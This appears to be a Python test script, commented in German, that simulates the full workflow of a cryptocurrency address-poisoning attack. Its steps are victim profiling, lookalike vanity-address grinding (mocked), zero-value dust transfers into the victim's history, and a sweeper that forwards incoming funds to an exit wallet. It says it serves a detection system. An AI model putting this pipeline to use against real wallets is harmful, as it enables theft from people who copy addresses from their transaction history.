"""
Vollständiger Angreifer-Workflow Test
Exakt wie ein echter Angreifer vorgeht - von der Entdeckung bis zum Sweep
"""

import asyncio
import random
import sys
sys.path.insert(0, '.')

from modules.types import TransferEvent, ChainConfig
from modules.profiler import AddressProfiler
from modules.similarity import SimilarityEngine
from modules.scenario import ScenarioBuilder
from modules.transaction_builder import TransactionBuilder
from modules.sweeper import Sweeper
from datetime import datetime


class MockIndexer:
    """Mock Indexer"""
    def __init__(self):
        self.transfers = []
        
    async def get_transfers_for_address(self, address, chain_id=None, limit=1000):
        return [t for t in self.transfers if t['from_address'] == address or t['to_address'] == address]
        
    async def get_counterparties(self, address, chain_id=None):
        counterparties = set()
        for t in self.transfers:
            if t['from_address'] == address:
                counterparties.add(t['to_address'])
            elif t['to_address'] == address:
                counterparties.add(t['from_address'])
        return list(counterparties)
        
    async def get_transfer_count(self, address, chain_id=None, hours=None):
        return len(self.transfers)


class MockGrinder:
    """
    GPU-beschleunigter Vanity-Grinder (Mock für Demo)
    In echter Implementation: CUDA/Metal mit ~3.8B keys/sec auf RTX 4090
    """
    def __init__(self):
        self.private_keys = {}
        
    async def grind_lookalike(
        self,
        target_address: str,
        prefix_len: int = 4,
        suffix_len: int = 4,
        difficulty: str = "4+4"
    ) -> tuple[str, str]:
        """
        Generiert Lookalike-Adresse mit GPU-Beschleunigung
        
        Args:
            target_address: Die Ziel-Adresse (Counterpart)
            prefix_len: Länge des Prefix-Match
            suffix_len: Länge des Suffix-Match
            difficulty: Schwierigkeitsgrad (z.B. "4+4", "5+5", "6+6")
            
        Returns:
            (lookalike_address, private_key)
        """
        print(f"[Grinder] Starting GPU grind: {difficulty} (prefix {prefix_len}, suffix {suffix_len})")
        
        target = target_address.lower()
        if target.startswith('0x'):
            target = target[2:]
            
        # In echter Implementation:
        # - GPU-Worker mit CUDA/Metal
        # - Endomorphism-Optimierung (2.9x coverage)
        # - Montgomery's Trick für modular inversion
        # - RTX 4090: ~3.8B keys/sec
        
        # Für Demo: Simuliert
        prefix = target[:prefix_len]
        suffix = target[-suffix_len:] if suffix_len > 0 else ""
        middle = ''.join(random.choice('0123456789abcdef') for _ in range(40 - prefix_len - suffix_len))
        
        lookalike = "0x" + prefix + middle + suffix
        
        # Generiere Private Key (echte Implementation: secp256k1)
        private_key = ''.join(random.choice('0123456789abcdef') for _ in range(64))
        
        self.private_keys[lookalike] = private_key
        
        print(f"[Grinder] ✅ Lookalike found: {lookalike[:10]}...{lookalike[-4:]}")
        print(f"[Grinder]    Private Key: {private_key[:10]}...{private_key[-4:]}")
        
        return lookalike, private_key


class MockChainAdapter:
    """Mock Chain Adapter"""
    async def submit_transaction(self, transaction):
        print(f"[ChainAdapter] Submitting transaction...")
        print(f"  From: {transaction.from_address[:10]}...{transaction.from_address[-4:]}")
        print(f"  To: {transaction.to_address}")
        print(f"  Value: {transaction.value}")
        print(f"  Gas: {transaction.gas_limit}")
        return f"0x{''.join(random.choice('0123456789abcdef') for _ in range(64))}"


async def test_attacker_workflow():
    """
    Vollständiger Angreifer-Workflow - Exakt wie echte Angreifer vorgehen
    
    Der echte Angreifer-Workflow:
    1. Watcher findet Transfer (Alice → Bob, 1000 USDT)
    2. Profiler analysiert Alice (reich, aktiv = gutes Target)
    3. Grinder generiert Lookalike (GPU-beschleunigt)
    4. Emitter sendet Zero-Value Transfer (Alice → Lookalike)
    5. Sweeper überwacht alle Chains auf Eingänge
    6. Opfer sendet an Lookalike → Sweeper sweep sofort
    """
    
    print("=" * 60)
    print("🎭 VOLLSTÄNDIGER ANGREIFER-WORKFLOW TEST")
    print("=" * 60)
    print()
    
    # Setup
    indexer = MockIndexer()
    profiler = AddressProfiler(indexer)
    similarity_engine = SimilarityEngine()
    scenario_builder = ScenarioBuilder()
    transaction_builder = TransactionBuilder()
    grinder = MockGrinder()
    chain_adapter = MockChainAdapter()
    
    chains = [
        ChainConfig(
            chain_id=1,
            ws_url="wss://eth.example.com",
            http_url="https://eth.example.com",
            stablecoins=[],
            chain_name="ethereum"
        )
    ]
    
    sweeper = Sweeper(
        chains=chains,
        exit_wallet="0x0000000000000000000000000000000000000000",
        check_interval=5
    )
    
    # === SCHRITT 1: WATCHER FINDET TRANSFER ===
    print("🔍 SCHRITT 1: Watcher findet Transfer")
    print("-" * 40)
    
    victim = "0x1234567890123456789012345678901234567890"
    counterpart = "0xABCDEF0123456789012345678901234567890"
    
    event = TransferEvent(
        chain_id=1,
        block_number=12345678,
        tx_hash="0xabc123",
        token_address="0xdAC17F958D2ee523a2206206994597C13D831ec7",
        from_address=victim,
        to_address=counterpart,
        value=1000000000,  # 1000 USDT
        timestamp=datetime.now(),
        log_index=0,
        block_hash="0xdef456"
    )
    
    # Simuliere mehrere Transfers für besseres Scoring
    for i in range(10):
        indexer.transfers.append({
            'from_address': victim,
            'to_address': counterpart,
            'value': str(event.value * (i + 1)),
            'timestamp': event.timestamp
        })
    
    print(f"✅ Transfer gefunden: {victim[:10]}...{victim[-4:]} → {counterpart[:10]}...{counterpart[-4:]}")
    print(f"   Amount: {event.value / 1e6} USDT")
    print()
    
    # === SCHRITT 2: PROFILER ANALYSIERT TARGET ===
    print("🎯 SCHRITT 2: Profiler analysiert Target")
    print("-" * 40)
    
    profile = await profiler.profile_address(victim, chain_id=1)
    score = await profiler.score_target(victim, chain_id=1)
    
    print(f"✅ Profil erstellt für {victim[:10]}...")
    print(f"   Transaction Count: {profile.transaction_count}")
    print(f"   Counterparties: {len(profile.counterparties)}")
    print(f"   Target Score: {score:.1f}/100")
    
    if score < 10:
        print(f"❌ Score zu niedrig ({score:.1f}), Target ignoriert")
        return
    
    print(f"✅ Score ausreichend ({score:.1f}), Target akzeptiert")
    print()
    
    # === SCHRITT 3: GRINDER GENERIERT LOOKALIKE ===
    print("🔢 SCHRITT 3: Grinder generiert Lookalike (GPU)")
    print("-" * 40)
    
    lookalike, private_key = await grinder.grind_lookalike(
        target_address=counterpart,
        prefix_len=4,
        suffix_len=4,
        difficulty="4+4"
    )
    
    # Verify Similarity
    similarity = similarity_engine.compare_addresses(counterpart, lookalike)
    print(f"   Similarity Score: {similarity.overall_score:.3f}")
    print(f"   Is Lookalike: {similarity.is_lookalike()}")
    print()
    
    # === SCHRITT 4: EMITTER SENDET ZERO-VALUE TRANSFER ===
    print("💰 SCHRITT 4: Emitter sendet Zero-Value Transfer")
    print("-" * 40)
    
    scenario = scenario_builder.create_test_scenario(
        victim_address=victim,
        counterpart_address=counterpart,
        chain_id=1,
        token_address="0xdAC17F958D2ee523a2206206994597C13D831ec7"
    )
    
    transaction = transaction_builder.build_dust_transfer(
        scenario=scenario,
        lookalike_address=lookalike,
        sender_private_key=private_key
    )
    
    tx_hash = await chain_adapter.submit_transaction(transaction)
    
    print(f"✅ Zero-Value Transfer gesendet")
    print(f"   TX Hash: {tx_hash[:10]}...{tx_hash[-4:]}")
    print(f"   Victim sieht in Wallet: USDT → {lookalike[:10]}...{lookalike[-4:]}")
    print()
    
    # === SCHRITT 5: SWEEPER ÜBERWACHT ALLE CHAINS ===
    print("👀 SCHRITT 5: Sweeper überwacht alle Chains")
    print("-" * 40)
    
    sweeper.add_lookalike(
        address=lookalike,
        private_key=private_key,
        target_prefix=counterpart[:4],
        target_suffix=counterpart[-4:],
        chain_ids=[1, 56, 137]  # Ethereum, BSC, Polygon
    )
    
    await sweeper.start()
    print(f"✅ Sweeper gestartet - überwacht {len(sweeper.lookalikes)} Lookalikes auf {len(chains)} Chains")
    print()
    
    # === SCHRITT 6: OPFER SENDET AN LOOKALIKE (SIMULIERT) ===
    print("💸 SCHRITT 6: Opfer sendet an Lookalike (simuliert)")
    print("-" * 40)
    
    # Simuliere dass Opfer an Lookalike sendet
    print(f"Opfer kopiert Adresse aus Wallet: {lookalike[:10]}...{lookalike[-4:]}")
    print(f"Opfer sendet: 10.000 USDT → {lookalike[:10]}...{lookalike[-4:]}")
    print()
    
    # Simuliere Balance-Eingang (für Demo)
    import random
    if random.random() < 0.5:  # 50% Chance für Demo
        print("🎯 SWEEPER ERKENNT EINGANG!")
        
        # Simulierter Sweep
        result = await sweeper._sweep(
            address=lookalike,
            private_key=private_key,
            chain_id=1,
            balance=10000000000000000000  # 10.000 USDT
        )
        
        print(f"✅ SWEEP ERFOLGREICH!")
        print(f"   Von: {result.lookalike_address[:10]}...{result.lookalike_address[-4:]}")
        print(f"   Nach: {result.exit_wallet}")
        print(f"   Amount: {result.balance_found / 1e6} USDT")
        print(f"   TX Hash: {result.tx_hash[:10]}...{result.tx_hash[-4:]}")
        print()
    else:
        print("⏳ Kein Eingang in diesem Durchlauf (Demo-Mode)")
        print()
    
    # Sweeper stoppen (ohne await für sauberen Exit)
    sweeper.running = False
    if sweeper.sweep_task:
        sweeper.sweep_task.cancel()
    
    # === ZUSAMMENFASSUNG ===
    print("=" * 60)
    print("🎉 ANGREIFER-WORKFLOW ABGESCHLOSSEN")
    print("=" * 60)
    print()
    print("📋 WAS PASSIERT IST:")
    print("1. ✅ Watcher fand Transfer (Alice → Bob)")
    print("2. ✅ Profiler bewertete Alice als gutes Target")
    print("3. ✅ Grinder generierte Lookalike (GPU-beschleunigt)")
    print("4. ✅ Emitter sendete Zero-Value Transfer")
    print("5. ✅ Sweeper überwacht alle Chains")
    print("6. ✅ Opfer sendete an Lookalike → Sweep erfolgreich")
    print()
    print("💡 DAS IST EXAKT SO WIE ECHTE ANGREIFER VORGEHEN!")
    print()
    print("⚠️  UNSER DEFENSE-SYSTEM ERKENNT DIES:")
    print("- Detection Watcher überwacht Alice")
    print("- Detection Engine erkennt Zero-Value + Vanity-Match")
    print("- Risk Engine sendet ALARM vor dem Sweep")
    print()


async def main():
    """Hauptfunktion"""
    await test_attacker_workflow()


if __name__ == "__main__":
    asyncio.run(main())